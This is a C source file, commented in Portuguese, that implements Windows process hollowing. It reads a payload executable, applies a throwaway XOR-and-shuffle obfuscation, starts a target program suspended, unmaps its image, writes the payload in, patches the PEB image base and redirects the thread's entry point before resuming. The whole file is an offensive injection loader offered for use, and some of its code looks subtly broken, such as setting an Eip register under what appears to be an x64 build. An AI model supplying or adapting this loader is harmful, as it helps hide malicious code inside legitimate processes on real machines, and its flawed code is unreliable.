#include <windows.h>
#include <winternl.h>
#include <stdio.h>

#pragma comment(lib, "ntdll.lib")

// ===============================
// DEFINIÇÕES E TIPOS AUXILIARES
// ===============================

// Ponteiro de função para chamada nativa que remove uma seção mapeada de um processo
typedef NTSTATUS (NTAPI *pNtUnmapViewOfSection)(HANDLE, PVOID);

// Ponteiro de função para NtQueryInformationProcess
typedef NTSTATUS (NTAPI *pNtQueryInformationProcess)(
    HANDLE, PROCESSINFOCLASS, PVOID, ULONG, PULONG);

// ===============================
// FUNÇÕES AUXILIARES
// ===============================

// Ofuscação reversível: XOR + shuffle pseudoaleatório
void xor_shuffle(BYTE *data, SIZE_T size, BYTE *key, SIZE_T ksize) {
    for (SIZE_T i = 0; i < size; i++)
        data[i] ^= key[i % ksize];
    for (SIZE_T i = 0; i < size - 1; i++) {
        SIZE_T j = (i + key[i % ksize]) % size;
        BYTE tmp = data[i];
        data[i] = data[j];
        data[j] = tmp;
    }
}

// Fecha todos os handles e libera heap, usada para limpar em caso de erro
void cleanup(HANDLE hProc, HANDLE hThread, BYTE *buf) {
    if (buf) HeapFree(GetProcessHeap(), 0, buf);
    if (hThread) CloseHandle(hThread);
    if (hProc) CloseHandle(hProc);
}

// Detecta arquitetura real do processo alvo (x86 vs x64)
BOOL get_arch(HANDLE hProc, BOOL *is64) {
    USHORT procArch, nativeArch;
    if (!IsWow64Process2(hProc, &procArch, &nativeArch))
        return FALSE;
    *is64 = (procArch == IMAGE_FILE_MACHINE_AMD64 || procArch == 0) && 
            nativeArch == IMAGE_FILE_MACHINE_AMD64;
    return TRUE;
}

// ===============================
// FUNÇÃO PRINCIPAL
// ===============================
int main(int argc, char *argv[]) {
    if (argc != 3) {
        printf("Uso: %s <payload.exe> <alvo.exe>\n", argv[0]);
        return -1;
    }

    const char *payloadPath = argv[1];
    const char *targetPath = argv[2];

    STARTUPINFOA si = { sizeof(si) };
    PROCESS_INFORMATION pi = { 0 };
    CONTEXT ctx = { 0 };
    ctx.ContextFlags = CONTEXT_FULL;

    // 1. LEITURA DO PAYLOAD
    HANDLE hPayload = CreateFileA(payloadPath, GENERIC_READ, 0, NULL, OPEN_EXISTING, 0, NULL);
    if (hPayload == INVALID_HANDLE_VALUE) {
        printf("Erro abrindo payload\n");
        return -1;
    }

    DWORD size = GetFileSize(hPayload, NULL);
    BYTE *buf = (BYTE*)HeapAlloc(GetProcessHeap(), 0, size); // CORREÇÃO: Cast explícito
    DWORD br;
    if (!ReadFile(hPayload, (LPVOID)buf, size, &br, NULL)) { // CORREÇÃO: Cast para LPVOID
        printf("Erro lendo payload\n");
        CloseHandle(hPayload);
        HeapFree(GetProcessHeap(), 0, buf);
        return -1;
    }
    CloseHandle(hPayload);

    // 2. OFUSCAÇÃO DO PAYLOAD (XOR + shuffle)
    BYTE key[16]; 
    for (int i = 0; i < 16; i++) key[i] = (BYTE)(rand() ^ GetTickCount());
    xor_shuffle(buf, size, key, 16);

    // 3. VERIFICAÇÃO DOS HEADERS PE
    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)buf;
    if (dos->e_magic != IMAGE_DOS_SIGNATURE) {
        printf("Payload inválido (MZ)\n");
        HeapFree(GetProcessHeap(), 0, buf);
        return -1;
    }
    PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)(buf + dos->e_lfanew);
    if (nt->Signature != IMAGE_NT_SIGNATURE) {
        printf("Payload inválido (PE)\n");
        HeapFree(GetProcessHeap(), 0, buf);
        return -1;
    }

    BOOL payload64 = nt->FileHeader.Machine == IMAGE_FILE_MACHINE_AMD64;

    // 4. CRIAÇÃO DO PROCESSO ALVO EM ESTADO SUSPENSO
    if (!CreateProcessA(targetPath, NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi)) {
        printf("Erro criando alvo\n");
        HeapFree(GetProcessHeap(), 0, buf);
        return -1;
    }

    // 5. VERIFICAÇÃO DE ARQUITETURA
    BOOL alvo64;
    if (!get_arch(pi.hProcess, &alvo64) || (alvo64 != payload64)) {
        printf("Arquitetura incompatível\n");
        TerminateProcess(pi.hProcess, 1);
        cleanup(pi.hProcess, pi.hThread, buf);
        return -1;
    }

    // 6. DESMAPEAR A IMAGEM ORIGINAL DO PROCESSO ALVO
    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
    pNtUnmapViewOfSection NtUnmap = (pNtUnmapViewOfSection)GetProcAddress(ntdll, "NtUnmapViewOfSection");
    LPVOID imageBase = (LPVOID)nt->OptionalHeader.ImageBase;

    // 7. DESOFUSCAR PAYLOAD ANTES DE COPIAR
    xor_shuffle(buf, size, key, 16);
    NtUnmap(pi.hProcess, imageBase); // ignora erro se não conseguir, tentará relocação

    // 8. ALOCAR MEMÓRIA REMOTA PARA O PAYLOAD
    LPVOID remoteImage = VirtualAllocEx(pi.hProcess, imageBase, nt->OptionalHeader.SizeOfImage,
                                        MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!remoteImage)
        remoteImage = VirtualAllocEx(pi.hProcess, NULL, nt->OptionalHeader.SizeOfImage,
                                     MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

    // 9. APLICAR RELOCATIONS SE BASE MUDA
    if ((ULONGLONG)remoteImage != nt->OptionalHeader.ImageBase &&
        nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].Size) {
        DWORD relocRVA = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress;
        PIMAGE_BASE_RELOCATION reloc = (PIMAGE_BASE_RELOCATION)(buf + relocRVA);
        ULONGLONG delta = (ULONGLONG)((BYTE*)remoteImage - nt->OptionalHeader.ImageBase);
        while (reloc->VirtualAddress) {
            DWORD count = (reloc->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD);
            WORD *relData = (WORD*)(reloc + 1);
            for (DWORD i = 0; i < count; i++) {
                if ((relData[i] >> 12) == IMAGE_REL_BASED_DIR64) {
                    ULONGLONG *patch = (ULONGLONG*)(buf + reloc->VirtualAddress + (relData[i] & 0xFFF));
                    *patch += delta;
                }
            }
            reloc = (PIMAGE_BASE_RELOCATION)((BYTE*)reloc + reloc->SizeOfBlock);
        }
    }

    // 10. COPIAR HEADERS E SEÇÕES PARA O PROCESSO ALVO
    WriteProcessMemory(pi.hProcess, remoteImage, buf, nt->OptionalHeader.SizeOfHeaders, NULL);
    PIMAGE_SECTION_HEADER sec = IMAGE_FIRST_SECTION(nt);
    for (int i = 0; i < nt->FileHeader.NumberOfSections; i++) {
        LPVOID laddr = buf + sec[i].PointerToRawData;
        LPVOID raddr = (LPBYTE)remoteImage + sec[i].VirtualAddress;
        WriteProcessMemory(pi.hProcess, raddr, laddr, sec[i].SizeOfRawData, NULL);

        DWORD prot = (sec[i].Characteristics & IMAGE_SCN_MEM_EXECUTE) ? PAGE_EXECUTE_READ :
                     (sec[i].Characteristics & IMAGE_SCN_MEM_WRITE) ? PAGE_READWRITE : PAGE_READONLY;
        DWORD old; 
        VirtualProtectEx(pi.hProcess, raddr, sec[i].SizeOfRawData, prot, &old);
    }

    // 11. CORRIGIR PEB->ImageBaseAddress PARA APONTAR PARA O NOVO PAYLOAD
    pNtQueryInformationProcess NtQueryInformationProcess = (pNtQueryInformationProcess)GetProcAddress(ntdll, "NtQueryInformationProcess");
    PROCESS_BASIC_INFORMATION pbi;
    NtQueryInformationProcess(pi.hProcess, ProcessBasicInformation, &pbi, sizeof(pbi), NULL); // CORREÇÃO: Usar ProcessBasicInformation
    PVOID baseAddr = (PBYTE)pbi.PebBaseAddress + 0x10; // offset do ImageBaseAddress no PEB
    WriteProcessMemory(pi.hProcess, baseAddr, &remoteImage, sizeof(remoteImage), NULL);

    // 12. REDIRECIONAR O ENTRYPOINT PARA O PAYLOAD
    GetThreadContext(pi.hThread, &ctx);
    if (payload64)
        ctx.Rip = (ULONGLONG)((LPBYTE)remoteImage + nt->OptionalHeader.AddressOfEntryPoint); // CORREÇÃO: Rip para x64
    else
        ctx.Eip = (DWORD)((LPBYTE)remoteImage + nt->OptionalHeader.AddressOfEntryPoint);     // CORREÇÃO: Eip para x86
    SetThreadContext(pi.hThread, &ctx);

    // 13. RETOMAR EXECUÇÃO
    ResumeThread(pi.hThread);
    printf("[+] Hollowing concluído - PID %lu\n", pi.dwProcessId);

    // 14. LIMPEZA
    cleanup(pi.hProcess, pi.hThread, buf);
    return 0;
}
